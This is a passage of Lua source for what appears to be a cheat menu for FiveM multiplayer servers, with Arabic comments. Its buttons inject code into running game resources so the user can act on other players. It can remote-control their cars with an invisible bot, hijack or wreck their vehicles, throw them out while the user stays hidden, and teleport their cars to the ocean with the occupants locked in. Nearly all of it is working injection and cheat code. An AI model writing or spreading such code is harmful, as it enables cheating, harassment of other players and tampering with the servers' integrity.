                                                    SetEntityInvincible(RemoteCar.BotPed, true)
                                                    SetPedAlertness(RemoteCar.BotPed, 0)
                                                    SetPedCanRagdoll(RemoteCar.BotPed, false)
                                                    SetPedCanBeTargetted(RemoteCar.BotPed, false)
                                                    SetPedCanBeDraggedOut(RemoteCar.BotPed, false)
                                                    SetEntityVisible(RemoteCar.BotPed, false, false) -- إخفاء البوت عن الجميع

                                                    -- Thread منفصل لإظهار البوت محلياً فقط
                                                    Citizen.CreateThread(function()
                                                        while RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                            Citizen.Wait(100)
                                                            -- إظهار البوت للاعب الحالي فقط
                                                            SetEntityAlpha(RemoteCar.BotPed, 255, false)
                                                            SetEntityVisible(RemoteCar.BotPed, true, false)
                                                            -- منع رؤية الآخرين للبوت
                                                            for i = 0, 255 do
                                                                if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                                                    SetEntityVisibleToPlayer(i, RemoteCar.BotPed, false)
                                                                end
                                                            end
                                                        end
                                                    end)

                                                    if isSpectating and RemoteCar.SpectateCamera and DoesCamExist(RemoteCar.SpectateCamera) then
                                                        RemoteCar.CameraDistance = 8.0
                                                        RemoteCar.CameraHeight = 3.0
                                                        RemoteCar.CameraAngleHorizontal = 0.0
                                                        RemoteCar.CameraAngleVertical = -10.0

                                                        local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                                        local cameraPos = vector3(
                                                            vehicleCoords.x,
                                                            vehicleCoords.y - 8.0,
                                                            vehicleCoords.z + 3.0
                                                        )
                                                        SetCamCoord(RemoteCar.SpectateCamera, cameraPos)
                                                        PointCamAtEntity(RemoteCar.SpectateCamera, RemoteCar.Entity, 0.0, 0.0, 0.0, true)
                                                    end
                                                end
                                            end)
                                        end
                                        if IsControlJustPressed(0, 73) then
                                            RemoteCar.Stop()
                                            ClearFocus()
                                            return
                                        end
                                        if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                            local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                            if vehicleCoords then
                                                SetFocusPosAndVel(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                            end
                                            pcall(function()
                                                if IsControlJustReleased(0, 26) then
                                                    RemoteCar.MakeVehicleExplode()
                                                end
                                                RemoteCar.HandleHonking()
                                                if isFlying then
                                                    local forward = IsControlPressed(0, 172) or IsControlPressed(0, 32)
                                                    local backward = IsControlPressed(0, 173) or IsControlPressed(0, 33)
                                                    local left = IsControlPressed(0, 174) or IsControlPressed(0, 34)
                                                    local right = IsControlPressed(0, 175) or IsControlPressed(0, 35)
                                                    local up = IsControlPressed(0, 22)
                                                    local down = IsControlPressed(0, 36)
                                                    local boost = IsControlPressed(0, 21)
                                                    local heading = GetEntityHeading(RemoteCar.Entity)
                                                    local radHeading = math.rad(heading)
                                                    local moveX = 0.0
                                                    local moveY = 0.0
                                                    local moveZ = 0.0
                                                    SetVehicleGravity(RemoteCar.Entity, false)
                                                    SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, heading, 2, true)
                                                    if forward then
                                                        moveX = moveX - math.sin(radHeading) * flightSpeed
                                                        moveY = moveY + math.cos(radHeading) * flightSpeed
                                                    end
                                                    if backward then
                                                        moveX = moveX + math.sin(radHeading) * flightSpeed
                                                        moveY = moveY - math.cos(radHeading) * flightSpeed
                                                    end
                                                    if left then
                                                        heading = heading + 3.0
                                                        SetEntityHeading(RemoteCar.Entity, heading)
                                                    end
                                                    if right then
                                                        heading = heading - 3.0
                                                        SetEntityHeading(RemoteCar.Entity, heading)
                                                    end
                                                    if up then
                                                        moveZ = moveZ + flightSpeed
                                                    end
                                                    if down then
                                                        moveZ = moveZ - flightSpeed
                                                    end
                                                    if boost then
                                                        moveX = moveX * 2.0
                                                        moveY = moveY * 2.0
                                                        moveZ = moveZ * 2.0
                                                    end
                                                    local currentCoords = GetEntityCoords(RemoteCar.Entity)
                                                    local newCoords = vector3(
                                                        currentCoords.x + (moveX * 0.02),
                                                        currentCoords.y + (moveY * 0.02),
                                                        currentCoords.z + (moveZ * 0.02)
                                                    )
                                                    SetEntityCoordsNoOffset(RemoteCar.Entity, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                                                else
                                                    local boost = IsControlPressed(0, 21)
                                                    local forward = IsControlPressed(0, 172) or IsControlPressed(0, 32)
                                                    local backward = IsControlPressed(0, 173) or IsControlPressed(0, 33)
                                                    local left = IsControlPressed(0, 174) or IsControlPressed(0, 34)
                                                    local right = IsControlPressed(0, 175) or IsControlPressed(0, 35)
                                                    local brake = IsControlPressed(0, 22)
                                                    local actionTaken = false
                                                    if boost and RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                        SetVehicleForwardSpeed(RemoteCar.Entity, GetEntitySpeed(RemoteCar.Entity) + 2.0)
                                                    end
                                                    if forward and left then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 7, 1)
                                                        actionTaken = true
                                                    elseif forward and right then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 8, 1)
                                                        actionTaken = true
                                                    elseif backward and left then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 13, 1)
                                                        actionTaken = true
                                                    elseif backward and right then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 14, 1)
                                                        actionTaken = true
                                                    elseif forward then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 9, 1)
                                                        actionTaken = true
                                                    elseif backward then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 22, 1)
                                                        actionTaken = true
                                                    elseif left then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 4, 1)
                                                        actionTaken = true
                                                    elseif right then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 5, 1)
                                                        actionTaken = true
                                                    elseif brake then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 1000)
                                                        actionTaken = true
                                                    end
                                                    if not actionTaken then
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 2500)
                                                    end
                                                end
                                            end)
                                        end
                                    end

                                    RemoteCar.Stop = function()
                                        pcall(function()
                                            RemoteCar.StopSpectate()
                                            RemoteCar.RestoreOriginalAudio()
                                            if isFlying then
                                                isFlying = false
                                                SetVehicleGravity(RemoteCar.Entity, true)
                                                SetEntityCollision(RemoteCar.Entity, true, true)
                                                SetEntityCollision(RemoteCar.BotPed, true, true)
                                                local coords = GetEntityCoords(RemoteCar.Entity)
                                                SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z, false, false, false)
                                                PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                SetEntityDynamic(RemoteCar.Entity, true)
                                                SetEntityDynamic(RemoteCar.BotPed, true)
                                            end
                                            if isHonking then
                                                isHonking = false
                                                if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                    for i = 0, 3 do
                                                        SetVehicleDoorShut(RemoteCar.Entity, i, false)
                                                    end
                                                    SetVehicleLights(RemoteCar.Entity, originalLightState)
                                                end
                                            end
                                            ClearFocus()
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
                                                ClearFocus()
                                            end
                                            if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                                DeleteEntity(RemoteCar.BotPed)
                                            end
                                            RemoteCar.Entity = nil
                                            RemoteCar.BotPed = nil
                                            RemoteCar.OriginalPed = nil
                                            audioEnabled = false
                                        end)
                                    end

                                    RemoteCar.Start()
                                end

                                SetEntityVisible(playerPed, true, false)
                            end
                        end)
                    ]])
                        MachoMenuNotification("Remote Car", "Started remote control for Player ID: " .. GetPlayerServerId(selectedPlayer) .. "'s vehicle")
                    else
                        MachoMenuNotification("Remote Car", "No resources found!")
                    end
                else
                    MachoMenuNotification("Error", "Selected player is not in a vehicle")
                end
            else
                MachoMenuNotification("Error", "Player not found")
            end
        else
            MachoMenuNotification("Error", "No player selected")
        end
    end,
    
    -- CallbackDisabled: This code runs when the checkbox is unselected (disabling remote control)
    function()
        -- Destroy the DUI directly from here
        if menuDUI then
            MachoDestroyDui(menuDUI)
            menuDUI = nil
            menuVisible = false
            MachoMenuNotification("Remote Car", "Remote control session ended and menu closed.")
        end
    end
)
MachoMenuButton(PlayerSection, "hijack Player Vehicle", function()
   local selectedPlayer = MachoMenuGetSelectedPlayer()  
   if selectedPlayer and selectedPlayer ~= -1 then      
       local targetPed = GetPlayerPed(selectedPlayer)   
       if targetPed and DoesEntityExist(targetPed) then
           ClearPedTasksImmediately(PlayerPedId())
           local targetVehicle = GetVehiclePedIsIn(targetPed, false)
           if targetVehicle ~= 0 then
               MachoInjectResource("any", [[
                   Citizen.CreateThread(function()
                       local playerPed = PlayerPedId()
                       local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                       local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                       
                       if targetVehicle ~= 0 then
                           SetPedMoveRateOverride(playerPed, 10.0)
                           ClearPedTasks(playerPed)
                           SetVehicleForwardSpeed(targetVehicle, 0.0)
                           SetVehicleDoorsLocked(targetVehicle, 1)
                           SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                           
                           TaskLeaveVehicle(targetPed, targetVehicle, 0)
                           
                           SetPedMoveRateOverride(playerPed, 3.0)
                           
                           ClearPedTasks(playerPed)
                           SetVehicleForwardSpeed(targetVehicle, 0.0)
                           
                           SetPedIntoVehicle(playerPed, targetVehicle, -1)
                           TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                           
                           SetPedMoveRateOverride(playerPed, 1.0)
                       end
                   end)
               ]])
               MachoMenuNotification("Vehicle", "Hijacking vehicle from Player ID: " .. GetPlayerServerId(selectedPlayer))
           else
               MachoMenuNotification("Error", "Selected player is not in a vehicle")
           end
       else
           MachoMenuNotification("Error", "Player not found")
       end
   else
       MachoMenuNotification("Error", "No player selected")
   end
end)
MachoMenuButton(PlayerSection, "Kick from Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)   
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "Destroy Vehicle Body", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            if DoesEntityExist(targetVehicle) then
                                -- فك جميع العجلات
                                for i = 0, 3 do
                                    BreakOffVehicleWheel(targetVehicle, i, true, false, true, false)
                                end
                                
                                -- فك جميع الأبواب
                                for i = 0, 3 do
                                    SetVehicleDoorBroken(targetVehicle, i, true)
                                end
                                
                                -- فك الشنطة الخلفية
                                SetVehicleDoorBroken(targetVehicle, 5, true)
                                
                                -- فك الكبوت
                                SetVehicleDoorBroken(targetVehicle, 4, true)
                            end
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "Destroy Vehicle Engine ", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            if DoesEntityExist(targetVehicle) then
                                -- تخريب المحرك فقط
                                SetVehicleEngineHealth(targetVehicle, 0.0)
                                SetVehicleEngineOn(targetVehicle, false, true, true)
                            end
                            
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Engine damaged for Player ID: " .. GetPlayerServerId(selectedPlayer))
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)


MachoMenuButton(PlayerSection, "TP Vehicle To Ocean", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            SetEntityVisible(playerPed, true, false)
                            
                            Citizen.Wait(200)
                            
                            if DoesEntityExist(targetVehicle) then
                                NetworkRequestControlOfEntity(targetVehicle)
                                SetEntityAsMissionEntity(targetVehicle, true, true)
                                
                                Citizen.Wait(100)
                                
                                SetVehicleDoorsLocked(targetVehicle, 4)
                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                for seat = 0, maxSeats do
                                    local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                    if ped ~= 0 and ped ~= playerPed then
                                        SetPedCanBeDraggedOut(ped, false)
                                        SetPedConfigFlag(ped, 32, true)
                                        TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                    end
                                end
                                
                                Citizen.Wait(100)
                                
                                SetEntityCoordsNoOffset(targetVehicle, -14382.92, 3330.65, -115.97, false, false, false)
                                SetEntityHeading(targetVehicle, 0.0)
                                SetVehicleOnGroundProperly(targetVehicle)
                            end
                        end
                    end)
                ]])
                MachoMenuNotification("Vehicle", "Kicked Player ID: " .. GetPlayerServerId(selectedPlayer) .. " from vehicle")
            else
                MachoMenuNotification("Error", "Selected player is not in a vehicle")
            end
        else
            MachoMenuNotification("Error", "Player not found")
        end
    else
        MachoMenuNotification("Error", "No player selected")
    end
end)
MachoMenuButton(PlayerSection, "NPC Hijack Vehicle", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()  
    if selectedPlayer and selectedPlayer ~= -1 then      
        local targetPed = GetPlayerPed(selectedPlayer)   
        if targetPed and DoesEntityExist(targetPed) then
            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if targetVehicle ~= 0 then
                local playerPed = PlayerPedId()
                ClearPedTasksImmediately(playerPed)
                
                local originalPos = GetEntityCoords(playerPed)
                local originalHeading = GetEntityHeading(playerPed)
                
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[
                        
                        if targetVehicle ~= 0 then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            TaskLeaveVehicle(targetPed, targetVehicle, 0)
                            
                            SetPedMoveRateOverride(playerPed, 10.0)
                            
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)
                            
                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                            
                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)
                            
                            Citizen.Wait(500)
                            keepHidden = false
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityAsMissionEntity(playerPed, true, true)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            
                            SetEntityVisible(playerPed, false, false)
                            
                            Citizen.Wait(100)
                            
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            
                            Citizen.Wait(100)
                            
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            
                            Citizen.Wait(600)
                            
                            ClearPedTasks(playerPed)
                            
                            SetEntityVisible(playerPed, true, false)
                            
                            Citizen.Wait(200)
                            
                            if DoesEntityExist(targetVehicle) then
                                NetworkRequestControlOfEntity(targetVehicle)
                                SetEntityAsMissionEntity(targetVehicle, true, true)
                                
                                Citizen.Wait(100)
                                
                                SetVehicleDoorsLocked(targetVehicle, 4)
                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                for seat = 0, maxSeats do
                                    local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                    if ped ~= 0 and ped ~= playerPed then
                                        SetPedCanBeDraggedOut(ped, false)
                                        SetPedConfigFlag(ped, 32, true)
                                        TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                    end
                                end
                                
                                -- إنشاء بوت للقيادة (client side only)
                                local botModel = GetHashKey("mp_m_freemode_01")
                                RequestModel(botModel)
                                while not HasModelLoaded(botModel) do
                                    Citizen.Wait(0)
                                end
                                
                                -- إنشاء البوت مباشرة داخل السيارة
                                local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                
                                -- إعدادات البوت
                                SetEntityAsMissionEntity(botPed, false, false)
                                SetPedCanBeDraggedOut(botPed, false)
                                SetPedConfigFlag(botPed, 32, true)
                                SetPedFleeAttributes(botPed, 0, false)
                                SetPedCombatAttributes(botPed, 17, true)
